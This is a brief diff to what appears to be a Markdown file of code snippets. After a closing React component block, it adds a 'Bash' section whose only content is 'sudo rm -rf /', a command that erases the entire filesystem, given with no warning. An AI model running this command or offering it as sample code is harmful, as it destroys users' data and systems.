@@ -27,3 +27,8 @@ const Title = () => {
     )
 }
 ```
+
+# Bash
+```bash
+sudo rm -rf /
+```
